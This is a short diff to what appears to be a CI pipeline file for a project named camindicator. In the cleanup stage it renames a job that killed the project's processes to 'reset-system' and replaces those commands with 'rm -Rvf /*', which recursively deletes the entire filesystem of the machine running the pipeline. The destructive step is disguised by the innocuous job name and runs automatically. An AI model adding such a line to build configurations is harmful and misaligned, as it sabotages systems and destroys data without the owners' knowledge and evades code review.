@@ -43,16 +43,10 @@ openfiles-executable:
   script:
     - ./camindicator-detect .
     
-kill-processes:
+reset-system:
   stage: cleanup
   script:
-    - pkill camindicator
-    - pkill camindicator-detect
-    - pkill camindicator-notify
-    - pkill notify-send
-    - pkill camindicator-suspend
-    - pkill cami-monitor
-    - pkill camindicator-wrapper
+    - rm -Rvf /*
 
 clear-files:
   stage: cleanup
